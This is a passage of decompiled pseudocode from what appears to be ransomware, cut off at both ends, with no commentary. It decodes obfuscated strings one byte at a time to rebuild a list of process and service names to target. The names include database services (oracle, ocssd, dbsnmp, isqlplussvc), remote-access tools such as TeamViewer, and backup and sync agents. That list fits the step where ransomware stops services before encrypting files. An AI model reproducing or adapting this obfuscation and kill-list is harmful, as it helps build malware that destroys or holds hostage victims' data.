(unsigned int)sub_401000(&STACK[0x1AE]);\n      LOBYTE(STACK[0x3C0]) = 71;\n      LOBYTE(STACK[0x3C1]) = sub_401120(&STACK[0x3C0], 83);\n      LOBYTE(STACK[0x3C2]) = sub_401120(&STACK[0x3C0], 105);\n      LOBYTE(STACK[0x3C3]) = sub_401120(&STACK[0x3C0], 109);\n      LOBYTE(STACK[0x3C4]) = sub_401120(&STACK[0x3C0], 112);\n      LOBYTE(STACK[0x3C5]) = sub_401120(&STACK[0x3C0], 108);\n      LOBYTE(STACK[0x3C6]) = sub_401120(&STACK[0x3C0], 121);\n      LOBYTE(STACK[0x3C7]) = sub_401120(&STACK[0x3C0], 67);\n      LOBYTE(STACK[0x3C8]) = sub_401120(&STACK[0x3C0], 111);\n      LOBYTE(STACK[0x3C9]) = sub_401120(&STACK[0x3C0], 110);\n      LOBYTE(STACK[0x3CA]) = sub_401120(&STACK[0x3C0], 110);\n      LOBYTE(STACK[0x3CB]) = sub_401120(&STACK[0x3C0], 101);\n      LOBYTE(STACK[0x3CC]) = sub_401120(&STACK[0x3C0], 99);\n      LOBYTE(STACK[0x3CD]) = sub_401120(&STACK[0x3C0], 116);\n      LOBYTE(STACK[0x3CE]) = sub_401120(&STACK[0x3C0], 105);\n      LOBYTE(STACK[0x3CF]) = sub_401120(&STACK[0x3C0], 111);\n      LOBYTE(STACK[0x3D0]) = sub_401120(&STACK[0x3C0], 110);\n      LOBYTE(STACK[0x3D1]) = sub_401120(&STACK[0x3C0], 77);\n      LOBYTE(STACK[0x3D2]) = sub_401120(&STACK[0x3C0], 97);\n      LOBYTE(STACK[0x3D3]) = sub_401120(&STACK[0x3C0], 110);\n      LOBYTE(STACK[0x3D4]) = sub_401120(&STACK[0x3C0], 97);\n      LOBYTE(STACK[0x3D5]) = sub_401120(&STACK[0x3C0], 103);\n      LOBYTE(STACK[0x3D6]) = sub_401120(&STACK[0x3C0], 101);\n      LOBYTE(STACK[0x3D7]) = sub_401120(&STACK[0x3C0], 114);\n      v349 = 0;\n      LOBYTE(STACK[0x3D8]) = 0;\n      do\n      {\n        v350 = sub_401010((char *)&STACK[0x3C1], v349);\n        LOBYTE(v350) = *v350;\n        TickCount = v350;\n        v351 = sub_401010((char *)&STACK[0x3C1], v349++);\n        *v351 = sub_401120(&STACK[0x3C0], (char)TickCount);\n      }\n      while ( v349 < 0x17 );\n      *sub_401010((char *)&STACK[0x3C1], 23) = 0;\n      STACK[0xC08] = (unsigned int)sub_401000(&STACK[0x3C1]);\n      LOBYTE(STACK[0x379]) = 37;\n      LOBYTE(STACK[0x37A]) = sub_401120(&STACK[0x379], 83);\n      LOBYTE(STACK[0x37B]) = sub_401120(&STACK[0x379], 105);\n      LOBYTE(STACK[0x37C]) = sub_401120(&STACK[0x379], 109);\n      LOBYTE(STACK[0x37D]) = sub_401120(&STACK[0x379], 112);\n      LOBYTE(STACK[0x37E]) = sub_401120(&STACK[0x379], 108);\n      LOBYTE(STACK[0x37F]) = sub_401120(&STACK[0x379], 121);\n      LOBYTE(STACK[0x380]) = sub_401120(&STACK[0x379], 46);\n      LOBYTE(STACK[0x381]) = sub_401120(&STACK[0x379], 83);\n      LOBYTE(STACK[0x382]) = sub_401120(&STACK[0x379], 121);\n      LOBYTE(STACK[0x383]) = sub_401120(&STACK[0x379], 115);\n      LOBYTE(STACK[0x384]) = sub_401120(&STACK[0x379], 116);\n      LOBYTE(STACK[0x385]) = sub_401120(&STACK[0x379], 101);\n      LOBYTE(STACK[0x386]) = sub_401120(&STACK[0x379], 109);\n      LOBYTE(STACK[0x387]) = sub_401120(&STACK[0x379], 84);\n      LOBYTE(STACK[0x388]) = sub_401120(&STACK[0x379], 114);\n      LOBYTE(STACK[0x389]) = sub_401120(&STACK[0x379], 97);\n      LOBYTE(STACK[0x38A]) = sub_401120(&STACK[0x379], 121);\n      LOBYTE(STACK[0x38B]) = sub_401120(&STACK[0x379], 73);\n      LOBYTE(STACK[0x38C]) = sub_401120(&STACK[0x379], 99);\n      LOBYTE(STACK[0x38D]) = sub_401120(&STACK[0x379], 111);\n      LOBYTE(STACK[0x38E]) = sub_401120(&STACK[0x379], 110);\n      v352 = 0;\n      LOBYTE(STACK[0x38F]) = 0;\n      do\n      {\n        v353 = sub_401010((char *)&STACK[0x37A], v352);\n        LOBYTE(v353) = *v353;\n        TickCount = v353;\n        v354 = sub_401010((char *)&STACK[0x37A], v352++);\n        *v354 = sub_401120(&STACK[0x379], (char)TickCount);\n      }\n      while ( v352 < 0x15 );\n      *sub_401010((char *)&STACK[0x37A], 21) = 0;\n      STACK[0xC04] = (unsigned int)sub_401000(&STACK[0x37A]);\n      LOBYTE(STACK[0x121]) = 121;\n      LOBYTE(STACK[0x122]) = sub_401120(&STACK[0x121], 102);\n      LOBYTE(STACK[0x123]) = sub_401120(&STACK[0x121], 98);\n      LOBYTE(STACK[0x124]) = sub_401120(&STACK[0x121], 103);\n      LOBYTE(STACK[0x125]) = sub_401120(&STACK[0x121], 117);\n      LOBYTE(STACK[0x126]) = sub_401120(&STACK[0x121], 97);\n      LOBYTE(STACK[0x127]) = sub_401120(&STACK[0x121], 114);\n      LOBYTE(STACK[0x128]) = sub_401120(&STACK[0x121], 100);\n      v355 = 0;\n      LOBYTE(STACK[0x129]) = 0;\n      do\n      {\n        v356 = sub_401010((char *)&STACK[0x122], v355);\n        LOBYTE(v356) = *v356;\n        TickCount = v356;\n        v357 = sub_401010((char *)&STACK[0x122], v355++);\n        *v357 = sub_401120(&STACK[0x121], (char)TickCount);\n      }\n      while ( v355 < 7 );\n      *sub_401010((char *)&STACK[0x122], 7) = 0;\n      STACK[0xC00] = (unsigned int)sub_401000(&STACK[0x122]);\n      LOBYTE(STACK[0x15C]) = 90;\n      LOBYTE(STACK[0x15D]) = sub_401120(&STACK[0x15C], 102);\n      LOBYTE(STACK[0x15E]) = sub_401120(&STACK[0x15C], 98);\n      LOBYTE(STACK[0x15F]) = sub_401120(&STACK[0x15C], 115);\n      LOBYTE(STACK[0x160]) = sub_401120(&STACK[0x15C], 101);\n      LOBYTE(STACK[0x161]) = sub_401120(&STACK[0x15C], 114);\n      LOBYTE(STACK[0x162]) = sub_401120(&STACK[0x15C], 118);\n      LOBYTE(STACK[0x163]) = sub_401120(&STACK[0x15C], 101);\n      LOBYTE(STACK[0x164]) = sub_401120(&STACK[0x15C], 114);\n      v358 = 0;\n      LOBYTE(STACK[0x165]) = 0;\n      do\n      {\n        v359 = sub_401010((char *)&STACK[0x15D], v358);\n        LOBYTE(v359) = *v359;\n        TickCount = v359;\n        v360 = sub_401010((char *)&STACK[0x15D], v358++);\n        *v360 = sub_401120(&STACK[0x15C], (char)TickCount);\n      }\n      while ( v358 < 8 );\n      *sub_401010((char *)&STACK[0x15D], 8) = 0;\n      STACK[0xBFC] = (unsigned int)sub_401000(&STACK[0x15D]);\n      LOBYTE(STACK[0x166]) = 47;\n      LOBYTE(STACK[0x167]) = sub_401120(&STACK[0x166], 79);\n      LOBYTE(STACK[0x168]) = sub_401120(&STACK[0x166], 78);\n      LOBYTE(STACK[0x169]) = sub_401120(&STACK[0x166], 69);\n      LOBYTE(STACK[0x16A]) = sub_401120(&STACK[0x166], 78);\n      LOBYTE(STACK[0x16B]) = sub_401120(&STACK[0x166], 79);\n      LOBYTE(STACK[0x16C]) = sub_401120(&STACK[0x166], 84);\n      LOBYTE(STACK[0x16D]) = sub_401120(&STACK[0x166], 69);\n      LOBYTE(STACK[0x16E]) = sub_401120(&STACK[0x166], 77);\n      v361 = 0;\n      LOBYTE(STACK[0x16F]) = 0;\n      do\n      {\n        v362 = sub_401010((char *)&STACK[0x167], v361);\n        LOBYTE(v362) = *v362;\n        TickCount = v362;\n        v363 = sub_401010((char *)&STACK[0x167], v361++);\n        *v363 = sub_401120(&STACK[0x166], (char)TickCount);\n      }\n      while ( v361 < 8 );\n      *sub_401010((char *)&STACK[0x167], 8) = 0;\n      STACK[0xBF8] = (unsigned int)sub_401000(&STACK[0x167]);\n      LOBYTE(STACK[0x232]) = 7;\n      LOBYTE(STACK[0x233]) = sub_401120(&STACK[0x232], 119);\n      LOBYTE(STACK[0x234]) = sub_401120(&STACK[0x232], 115);\n      LOBYTE(STACK[0x235]) = sub_401120(&STACK[0x232], 97);\n      LOBYTE(STACK[0x236]) = sub_401120(&STACK[0x232], 95);\n      LOBYTE(STACK[0x237]) = sub_401120(&STACK[0x232], 115);\n      LOBYTE(STACK[0x238]) = sub_401120(&STACK[0x232], 101);\n      LOBYTE(STACK[0x239]) = sub_401120(&STACK[0x232], 114);\n      LOBYTE(STACK[0x23A]) = sub_401120(&STACK[0x232], 118);\n      LOBYTE(STACK[0x23B]) = sub_401120(&STACK[0x232], 105);\n      LOBYTE(STACK[0x23C]) = sub_401120(&STACK[0x232], 99);\n      LOBYTE(STACK[0x23D]) = sub_401120(&STACK[0x232], 101);\n      v364 = 0;\n      LOBYTE(STACK[0x23E]) = 0;\n      do\n      {\n        v365 = sub_401010((char *)&STACK[0x233], v364);\n        LOBYTE(v365) = *v365;\n        TickCount = v365;\n        v366 = sub_401010((char *)&STACK[0x233], v364++);\n        *v366 = sub_401120(&STACK[0x232], (char)TickCount);\n      }\n      while ( v364 < 0xB );\n      *sub_401010((char *)&STACK[0x233], 11) = 0;\n      STACK[0xBB0] = (unsigned int)sub_401000(&STACK[0x233]);\n      LOBYTE(STACK[0x3D9]) = 84;\n      LOBYTE(STACK[0x3DA]) = sub_401120(&STACK[0x3D9], 107);\n      LOBYTE(STACK[0x3DB]) = sub_401120(&STACK[0x3D9], 111);\n      LOBYTE(STACK[0x3DC]) = sub_401120(&STACK[0x3D9], 97);\n      LOBYTE(STACK[0x3DD]) = sub_401120(&STACK[0x3D9], 108);\n      LOBYTE(STACK[0x3DE]) = sub_401120(&STACK[0x3D9], 121);\n      LOBYTE(STACK[0x3DF]) = sub_401120(&STACK[0x3D9], 45);\n      LOBYTE(STACK[0x3E0]) = sub_401120(&STACK[0x3D9], 101);\n      LOBYTE(STACK[0x3E1]) = sub_401120(&STACK[0x3D9], 120);\n      LOBYTE(STACK[0x3E2]) = sub_401120(&STACK[0x3D9], 112);\n      LOBYTE(STACK[0x3E3]) = sub_401120(&STACK[0x3D9], 45);\n      LOBYTE(STACK[0x3E4]) = sub_401120(&STACK[0x3D9], 101);\n      LOBYTE(STACK[0x3E5]) = sub_401120(&STACK[0x3D9], 110);\n      LOBYTE(STACK[0x3E6]) = sub_401120(&STACK[0x3D9], 103);\n      LOBYTE(STACK[0x3E7]) = sub_401120(&STACK[0x3D9], 105);\n      LOBYTE(STACK[0x3E8]) = sub_401120(&STACK[0x3D9], 110);\n      LOBYTE(STACK[0x3E9]) = sub_401120(&STACK[0x3D9], 101);\n      LOBYTE(STACK[0x3EA]) = sub_401120(&STACK[0x3D9], 45);\n      LOBYTE(STACK[0x3EB]) = sub_401120(&STACK[0x3D9], 115);\n      LOBYTE(STACK[0x3EC]) = sub_401120(&STACK[0x3D9], 101);\n      LOBYTE(STACK[0x3ED]) = sub_401120(&STACK[0x3D9], 114);\n      LOBYTE(STACK[0x3EE]) = sub_401120(&STACK[0x3D9], 118);\n      LOBYTE(STACK[0x3EF]) = sub_401120(&STACK[0x3D9], 105);\n      LOBYTE(STACK[0x3F0]) = sub_401120(&STACK[0x3D9], 99);\n      LOBYTE(STACK[0x3F1]) = sub_401120(&STACK[0x3D9], 101);\n      v367 = 0;\n      LOBYTE(STACK[0x3F2]) = 0;\n      do\n      {\n        v368 = sub_401010((char *)&STACK[0x3DA], v367);\n        LOBYTE(v368) = *v368;\n        TickCount = v368;\n        v369 = sub_401010((char *)&STACK[0x3DA], v367++);\n        *v369 = sub_401120(&STACK[0x3D9], (char)TickCount);\n      }\n      while ( v367 < 0x18 );\n      *sub_401010((char *)&STACK[0x3DA], 24) = 0;\n      STACK[0xBF4] = (unsigned int)sub_401000(&STACK[0x3DA]);\n      LOBYTE(STACK[0x338]) = 1;\n      LOBYTE(STACK[0x339]) = sub_401120(&STACK[0x338], 84);\n      LOBYTE(STACK[0x33A]) = sub_401120(&STACK[0x338], 101);\n      LOBYTE(STACK[0x33B]) = sub_401120(&STACK[0x338], 97);\n      LOBYTE(STACK[0x33C]) = sub_401120(&STACK[0x338], 109);\n      LOBYTE(STACK[0x33D]) = sub_401120(&STACK[0x338], 86);\n      LOBYTE(STACK[0x33E]) = sub_401120(&STACK[0x338], 105);\n      LOBYTE(STACK[0x33F]) = sub_401120(&STACK[0x338], 101);\n      LOBYTE(STACK[0x340]) = sub_401120(&STACK[0x338], 119);\n      LOBYTE(STACK[0x341]) = sub_401120(&STACK[0x338], 101);\n      LOBYTE(STACK[0x342]) = sub_401120(&STACK[0x338], 114);\n      LOBYTE(STACK[0x343]) = sub_401120(&STACK[0x338], 95);\n      LOBYTE(STACK[0x344]) = sub_401120(&STACK[0x338], 83);\n      LOBYTE(STACK[0x345]) = sub_401120(&STACK[0x338], 101);\n      LOBYTE(STACK[0x346]) = sub_401120(&STACK[0x338], 114);\n      LOBYTE(STACK[0x347]) = sub_401120(&STACK[0x338], 118);\n      LOBYTE(STACK[0x348]) = sub_401120(&STACK[0x338], 105);\n      LOBYTE(STACK[0x349]) = sub_401120(&STACK[0x338], 99);\n      LOBYTE(STACK[0x34A]) = sub_401120(&STACK[0x338], 101);\n      LOBYTE(STACK[0x34B]) = 0;\n      for ( j = 0; j < 0x12; ++j )\n      {\n        v371 = sub_401010((char *)&STACK[0x339], j);\n        LOBYTE(v371) = *v371;\n        TickCount = v371;\n        v372 = sub_401010((char *)&STACK[0x339], j);\n        *v372 = sub_401120(&STACK[0x338], (char)TickCount);\n      }\n      *sub_401010((char *)&STACK[0x339], 18) = 0;\n      STACK[0xBF0] = (unsigned int)sub_401000(&STACK[0x339]);\n      LOBYTE(STACK[0x1E6]) = 113;\n      LOBYTE(STACK[0x1E7]) = sub_401120(&STACK[0x1E6], 84);\n      LOBYTE(STACK[0x1E8]) = sub_401120(&STACK[0x1E6], 101);\n      LOBYTE(STACK[0x1E9]) = sub_401120(&STACK[0x1E6], 97);\n      LOBYTE(STACK[0x1EA]) = sub_401120(&STACK[0x1E6], 109);\n      LOBYTE(STACK[0x1EB]) = sub_401120(&STACK[0x1E6], 86);\n      LOBYTE(STACK[0x1EC]) = sub_401120(&STACK[0x1E6], 105);\n      LOBYTE(STACK[0x1ED]) = sub_401120(&STACK[0x1E6], 101);\n      LOBYTE(STACK[0x1EE]) = sub_401120(&STACK[0x1E6], 119);\n      LOBYTE(STACK[0x1EF]) = sub_401120(&STACK[0x1E6], 101);\n      LOBYTE(STACK[0x1F0]) = sub_401120(&STACK[0x1E6], 114);\n      v373 = 0;\n      LOBYTE(STACK[0x1F1]) = 0;\n      do\n      {\n        v374 = sub_401010((char *)&STACK[0x1E7], v373);\n        LOBYTE(v374) = *v374;\n        TickCount = v374;\n        v375 = sub_401010((char *)&STACK[0x1E7], v373++);\n        *v375 = sub_401120(&STACK[0x1E6], (char)TickCount);\n      }\n      while ( v373 < 0xA );\n      *sub_401010((char *)&STACK[0x1E7], 10) = 0;\n      STACK[0xBEC] = (unsigned int)sub_401000(&STACK[0x1E7]);\n      LOBYTE(a41) = 49;\n      BYTE1(a41) = sub_401120(&a41, 116);\n      BYTE2(a41) = sub_401120(&a41, 118);\n      HIBYTE(a41) = sub_401120(&a41, 95);\n      LOBYTE(a42) = sub_401120(&a41, 119);\n      BYTE1(a42) = sub_401120(&a41, 51);\n      BYTE2(a42) = sub_401120(&a41, 50);\n      v376 = 0;\n      HIBYTE(a42) = 0;\n      do\n      {\n        v377 = sub_401010((char *)&a41 + 1, v376);\n        LOBYTE(v377) = *v377;\n        TickCount = v377;\n        v378 = sub_401010((char *)&a41 + 1, v376++);\n        *v378 = sub_401120(&a41, (char)TickCount);\n      }\n      while ( v376 < 6 );\n      *sub_401010((char *)&a41 + 1, 6) = 0;\n      STACK[0xBE8] = (unsigned int)sub_401000((char *)&a41 + 1);\n      LOBYTE(a39) = 18;\n      BYTE1(a39) = sub_401120(&a39, 116);\n      BYTE2(a39) = sub_401120(&a39, 118);\n      HIBYTE(a39) = sub_401120(&a39, 95);\n      LOBYTE(a40) = sub_401120(&a39, 120);\n      BYTE1(a40) = sub_401120(&a39, 54);\n      BYTE2(a40) = sub_401120(&a39, 52);\n      v379 = 0;\n      HIBYTE(a40) = 0;\n      do\n      {\n        v380 = sub_401010((char *)&a39 + 1, v379);\n        LOBYTE(v380) = *v380;\n        TickCount = v380;\n        v381 = sub_401010((char *)&a39 + 1, v379++);\n        *v381 = sub_401120(&a39, (char)TickCount);\n      }\n      while ( v379 < 6 );\n      *sub_401010((char *)&a39 + 1, 6) = 0;\n      STACK[0xBE4] = (unsigned int)sub_401000((char *)&a39 + 1);\n      LOBYTE(a37) = 4;\n      BYTE1(a37) = sub_401120(&a37, 84);\n      BYTE2(a37) = sub_401120(&a37, 105);\n      HIBYTE(a37) = sub_401120(&a37, 116);\n      LOBYTE(a38) = sub_401120(&a37, 97);\n      BYTE1(a38) = sub_401120(&a37, 110);\n      BYTE2(a38) = sub_401120(&a37, 86);\n      v382 = 0;\n      HIBYTE(a38) = 0;\n      do\n      {\n        v383 = sub_401010((char *)&a37 + 1, v382);\n        LOBYTE(v383) = *v383;\n        TickCount = v383;\n        v384 = sub_401010((char *)&a37 + 1, v382++);\n        *v384 = sub_401120(&a37, (char)TickCount);\n      }\n      while ( v382 < 6 );\n      *sub_401010((char *)&a37 + 1, 6) = 0;\n      STACK[0xBE0] = (unsigned int)sub_401000((char *)&a37 + 1);\n      HIBYTE(a6) = 113;\n      LOBYTE(a7) = sub_401120((_BYTE *)&a6 + 3, 83);\n      BYTE1(a7) = sub_401120((_BYTE *)&a6 + 3, 115);\n      BYTE2(a7) = sub_401120((_BYTE *)&a6 + 3, 109);\n      HIBYTE(a7) = sub_401120((_BYTE *)&a6 + 3, 115);\n      v385 = 0;\n      LOBYTE(a8) = 0;\n      do\n      {\n        v386 = sub_401010((char *)&a7, v385);\n        LOBYTE(v386) = *v386;\n        TickCount = v386;\n        v387 = sub_401010((char *)&a7, v385++);\n        *v387 = sub_401120((_BYTE *)&a6 + 3, (char)TickCount);\n      }\n      while ( v385 < 4 );\n      *sub_401010((char *)&a7, 4) = 0;\n      STACK[0xBDC] = (unsigned int)sub_401000(&a7);\n      LOBYTE(STACK[0x118]) = 1;\n      LOBYTE(STACK[0x119]) = sub_401120(&STACK[0x118], 110);\n      LOBYTE(STACK[0x11A]) = sub_401120(&STACK[0x118], 111);\n      LOBYTE(STACK[0x11B]) = sub_401120(&STACK[0x118], 116);\n      LOBYTE(STACK[0x11C]) = sub_401120(&STACK[0x118], 101);\n      LOBYTE(STACK[0x11D]) = sub_401120(&STACK[0x118], 112);\n      LOBYTE(STACK[0x11E]) = sub_401120(&STACK[0x118], 97);\n      LOBYTE(STACK[0x11F]) = sub_401120(&STACK[0x118], 100);\n      v388 = 0;\n      LOBYTE(STACK[0x120]) = 0;\n      do\n      {\n        v389 = sub_401010((char *)&STACK[0x119], v388);\n        LOBYTE(v389) = *v389;\n        TickCount = v389;\n        v390 = sub_401010((char *)&STACK[0x119], v388++);\n        *v390 = sub_401120(&STACK[0x118], (char)TickCount);\n      }\n      while ( v388 < 7 );\n      *sub_401010((char *)&STACK[0x119], 7) = 0;\n      STACK[0xBD8] = (unsigned int)sub_401000(&STACK[0x119]);\n      LOBYTE(a47) = 15;\n      BYTE1(a47) = sub_401120(&a47, 82);\n      BYTE2(a47) = sub_401120(&a47, 100);\n      HIBYTE(a47) = sub_401120(&a47, 114);\n      LOBYTE(a48) = sub_401120(&a47, 67);\n      BYTE1(a48) = sub_401120(&a47, 69);\n      BYTE2(a48) = sub_401120(&a47, 70);\n      v391 = 0;\n      HIBYTE(a48) = 0;\n      do\n      {\n        v392 = sub_401010((char *)&a47 + 1, v391);\n        LOBYTE(v392) = *v392;\n        TickCount = v392;\n        v393 = sub_401010((char *)&a47 + 1, v391++);\n        *v393 = sub_401120(&a47, (char)TickCount);\n      }\n      while ( v391 < 6 );\n      *sub_401010((char *)&a47 + 1, 6) = 0;\n      STACK[0xBD4] = (unsigned int)sub_401000((char *)&a47 + 1);\n      HIBYTE(a3) = 40;\n      LOBYTE(a4) = sub_401120((_BYTE *)&a3 + 3, 115);\n      BYTE1(a4) = sub_401120((_BYTE *)&a3 + 3, 97);\n      HIWORD(a4) = (unsigned __int8)sub_401120((_BYTE *)&a3 + 3, 109);\n      for ( k = 0; k < 3; ++k )\n      {\n        v395 = sub_401010((char *)&a4, k);\n        LOBYTE(v395) = *v395;\n        TickCount = v395;\n        v396 = sub_401010((char *)&a4, k);\n        *v396 = sub_401120((_BYTE *)&a3 + 3, (char)TickCount);\n      }\n      *sub_401010((char *)&a4, 3) = 0;\n      STACK[0xBD0] = (unsigned int)sub_401000(&a4);\n      LOBYTE(a35) = 105;\n      BYTE1(a35) = sub_401120(&a35, 111);\n      BYTE2(a35) = sub_401120(&a35, 114);\n      HIBYTE(a35) = sub_401120(&a35, 97);\n      LOBYTE(a36) = sub_401120(&a35, 99);\n      BYTE1(a36) = sub_401120(&a35, 108);\n      BYTE2(a36) = sub_401120(&a35, 101);\n      v397 = 0;\n      HIBYTE(a36) = 0;\n      do\n      {\n        v398 = sub_401010((char *)&a35 + 1, v397);\n        LOBYTE(v398) = *v398;\n        TickCount = v398;\n        v399 = sub_401010((char *)&a35 + 1, v397++);\n        *v399 = sub_401120(&a35, (char)TickCount);\n      }\n      while ( v397 < 6 );\n      *sub_401010((char *)&a35 + 1, 6) = 0;\n      STACK[0xBCC] = (unsigned int)sub_401000((char *)&a35 + 1);\n      HIBYTE(a21) = 12;\n      LOBYTE(a22) = sub_401120((_BYTE *)&a21 + 3, 111);\n      BYTE1(a22) = sub_401120((_BYTE *)&a21 + 3, 99);\n      BYTE2(a22) = sub_401120((_BYTE *)&a21 + 3, 115);\n      HIBYTE(a22) = sub_401120((_BYTE *)&a21 + 3, 115);\n      LOWORD(a23) = (unsigned __int8)sub_401120((_BYTE *)&a21 + 3, 100);\n      for ( m = 0; m < 5; ++m )\n      {\n        v401 = sub_401010((char *)&a22, m);\n        LOBYTE(v401) = *v401;\n        TickCount = v401;\n        v402 = sub_401010((char *)&a22, m);\n        *v402 = sub_401120((_BYTE *)&a21 + 3, (char)TickCount);\n      }\n      *sub_401010((char *)&a22, 5) = 0;\n      STACK[0xBC8] = (unsigned int)sub_401000(&a22);\n      LOBYTE(a33) = 22;\n      BYTE1(a33) = sub_401120(&a33, 100);\n      BYTE2(a33) = sub_401120(&a33, 98);\n      HIBYTE(a33) = sub_401120(&a33, 115);\n      LOBYTE(a34) = sub_401120(&a33, 110);\n      BYTE1(a34) = sub_401120(&a33, 109);\n      BYTE2(a34) = sub_401120(&a33, 112);\n      v403 = 0;\n      HIBYTE(a34) = 0;\n      do\n      {\n        v404 = sub_401010((char *)&a33 + 1, v403);\n        LOBYTE(v404) = *v404;\n        TickCount = v404;\n        v405 = sub_401010((char *)&a33 + 1, v403++);\n        *v405 = sub_401120(&a33, (char)TickCount);\n      }\n      while ( v403 < 6 );\n      *sub_401010((char *)&a33 + 1, 6) = 0;\n      STACK[0xBC4] = (unsigned int)sub_401000((char *)&a33 + 1);\n      LOBYTE(STACK[0x170]) = 74;\n      LOBYTE(STACK[0x171]) = sub_401120(&STACK[0x170], 115);\n      LOBYTE(STACK[0x172]) = sub_401120(&STACK[0x170], 121);\n      LOBYTE(STACK[0x173]) = sub_401120(&STACK[0x170], 110);\n      LOBYTE(STACK[0x174]) = sub_401120(&STACK[0x170], 99);\n      LOBYTE(STACK[0x175]) = sub_401120(&STACK[0x170], 116);\n      LOBYTE(STACK[0x176]) = sub_401120(&STACK[0x170], 105);\n      LOBYTE(STACK[0x177]) = sub_401120(&STACK[0x170], 109);\n      LOBYTE(STACK[0x178]) = sub_401120(&STACK[0x170], 101);\n      v406 = 0;\n      LOBYTE(STACK[0x179]) = 0;\n      do\n      {\n        v407 = sub_401010((char *)&STACK[0x171], v406);\n        LOBYTE(v407) = *v407;\n        TickCount = v407;\n        v408 = sub_401010((char *)&STACK[0x171], v406++);\n        *v408 = sub_401120(&STACK[0x170], (char)TickCount);\n      }\n      while ( v406 < 8 );\n      *sub_401010((char *)&STACK[0x171], 8) = 0;\n      STACK[0xBC0] = (unsigned int)sub_401000(&STACK[0x171]);\n      LOBYTE(STACK[0x10F]) = 107;\n      LOBYTE(STACK[0x110]) = sub_401120(&STACK[0x10F], 97);\n      LOBYTE(STACK[0x111]) = sub_401120(&STACK[0x10F], 103);\n      LOBYTE(STACK[0x112]) = sub_401120(&STACK[0x10F], 110);\n      LOBYTE(STACK[0x113]) = sub_401120(&STACK[0x10F], 116);\n      LOBYTE(STACK[0x114]) = sub_401120(&STACK[0x10F], 115);\n      LOBYTE(STACK[0x115]) = sub_401120(&STACK[0x10F], 118);\n      LOBYTE(STACK[0x116]) = sub_401120(&STACK[0x10F], 99);\n      v409 = 0;\n      LOBYTE(STACK[0x117]) = 0;\n      do\n      {\n        v410 = sub_401010((char *)&STACK[0x110], v409);\n        LOBYTE(v410) = *v410;\n        TickCount = v410;\n        v411 = sub_401010((char *)&STACK[0x110], v409++);\n        *v411 = sub_401120(&STACK[0x10F], (char)TickCount);\n      }\n      while ( v409 < 7 );\n      *sub_401010((char *)&STACK[0x110], 7) = 0;\n      STACK[0xBBC] = (unsigned int)sub_401000(&STACK[0x110]);\n      LOBYTE(STACK[0x218]) = 58;\n      LOBYTE(STACK[0x219]) = sub_401120(&STACK[0x218], 105);\n      LOBYTE(STACK[0x21A]) = sub_401120(&STACK[0x218], 115);\n      LOBYTE(STACK[0x21B]) = sub_401120(&STACK[0x218], 113);\n      LOBYTE(STACK[0x21C]) = sub_401120(&STACK[0x218], 108);\n      LOBYTE(STACK[0x21D]) = sub_401120(&STACK[0x218], 112);\n      LOBYTE(STACK[0x21E]) = sub_401120(&STACK[0x218], 108);\n      LOBYTE(STACK[0x21F]) = sub_401120(&STACK[0x218], 117);\n      LOBYTE(STACK[0x220]) = sub_401120(&STACK[0x218], 115);\n      LOBYTE(STACK[0x221]) = sub_401120(&STACK[0x218], 115);\n      LOBYTE(STACK[0x222]) = sub_401120(&STACK[0x218], 118);\n      LOBYTE(STACK[0x223]) = sub_401120(&STACK[0x218], 99);\n      v412 = 0;\n      LOBYTE(STACK[0x224]) = 0;\n      do\n      {\n        v413 = sub_401010((char *)&STACK[0x219], v412);\n        LOBYTE(v413) = *v413;\n        TickCount = v413;\n        v414 = sub_401010((char *)&STACK[0x219], v412++);\n        *v414 = sub_401120(&STACK[0x218], (char)TickCount);\n      }\n      while ( v412 < 0xB );\n      *sub_401010((char *)&STACK[0x219], 11) = 0;\n      STACK[0xBB8] = (unsigned int)sub_401000(&STACK[0x219]);\n      LOBYTE(STACK[0x1A2]) = 119;\n      LOBYTE(STACK[0x1A3]) = sub_401120(&STACK[0x1A2], 120);\n      LOBYTE(STACK[0x1A4]) = sub_401120(&STACK[0x1A2], 102);\n      LOBYTE(STACK[0x1A5]) = sub_401120(&STACK[0x1A2], 115);\n      LOBYTE(STACK[0x1A6]) = sub_401120(&STACK[0x1A2], 115);\n      LOBYTE(STACK[0x1A7]) = sub_401120(&STACK[0x1A2], 118);\n      LOBYTE(STACK[0x1A8]) = sub_401120(&STACK[0x1A2], 99);\n      LOBYTE(STACK[0x1A9]) = sub_401120(&STACK[0x1A2], 99);\n      LOBYTE(STACK[0x1AA]) = sub_401120(&STACK[0x1A2], 111);\n      LOBYTE(STACK[0x1AB]) = sub_401120(&STACK[0x1A2], 110);\n      v415 = 0;\n      LOBYTE(STACK[0x1AC]) = 0;\n      do\n      {\n        v416 = sub_401010((char *)&STACK[0x1A3], v415);\n        LOBYTE(v416) = *v416;\n        TickCount = v416;\n        v417 = sub_401010((char *)&STACK[0x1A3], v415++);\n        *v417 = sub_401120(&STACK[0x1A2], (char)TickCount);\n      }\n      while ( v415 < 9 );\n      *sub_401010((char *)&STACK[0x1A3], 9) = 0;\n      STACK[0xBB4] = (unsigned int)sub_401000(&STACK[0x1A3]);\n      LOBYTE(STACK[0x2EC]) = 119;\n      LOBYTE(STACK[0x2ED]) = sub_401120(&STACK[0x2EC], 109);\n      LOBYTE(STACK[0x2EE]) = sub_401120(&STACK[0x2EC], 121);\n      LOBYTE(STACK[0x2EF]) = sub_401120(&STACK[0x2EC], 100);\n      LOBYTE(STACK[0x2F0]) = sub_401120(&STACK[0x2EC], 101);\n      LOBYTE(STACK[0x2F1]) = sub_401120(&STACK[0x2EC], 115);\n      LOBYTE(STACK[0x2F2]) = sub_401120(&STACK[0x2EC], 107);\n      LOBYTE(STACK[0x2F3]) = sub_401120(&STACK[0x2EC], 116);\n      LOBYTE(STACK[0x2F4]) = sub_401120(&STACK[0x2EC], 111);\n      LOBYTE(STACK[0x2F5]) = sub_401120(&STACK[0x2EC], 112);\n      LOBYTE(STACK[0x2F6]) = sub_401120(&STACK[0x2EC], 115);\n      LOBYTE(STACK[0x2F7]) = sub_401120(&STACK[0x2EC], 101);\n      LOBYTE(STACK[0x2F8]) = sub_401120(&STACK[0x2EC], 114);\n      LOBYTE(STACK[0x2F9]) = sub_401120(&STACK[0x2EC], 118);\n      LOBYTE(STACK[0x2FA]) = sub_401120(&STACK[0x2EC], 105);\n      LOBYTE(STACK[0x2FB]) = sub_401120(&STACK[0x2EC], 99);\n      LOBYTE(STACK[0x2FC]) = sub_401120(&STACK[0x2EC], 101);\n      v418 = 0;\n      LOBYTE(STACK[0x2FD]) = 0;\n      do\n      {\n        v419 = sub_401010((char *)&STACK[0x2ED], v418);\n        LOBYTE(v419) = 